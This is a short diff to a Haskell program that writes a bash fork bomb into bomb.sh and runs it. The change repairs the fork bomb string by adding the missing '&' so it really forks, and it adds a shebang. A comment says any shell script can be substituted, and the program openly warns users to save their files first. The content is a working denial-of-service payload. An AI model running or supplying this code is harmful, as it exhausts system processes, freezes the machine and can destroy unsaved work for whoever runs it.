@@ -10,8 +10,8 @@ import System.Process
 
 --Useful variables to keep line lengths down
 --Can substitute any valid shell script for the text in bomb
-bomb =  ":(){ :|: };:\n"
-command = "echo \"" ++ bomb ++ "\" > bomb.sh | bash bomb.sh"
+bomb =  ":(){ :|:& };:\n"
+command = "echo \"#!/bin/bash\n" ++ bomb ++ "\" > bomb.sh | bash bomb.sh"
 
 main = do
 	putStrLn "Have you saved all your files? (y/n)"
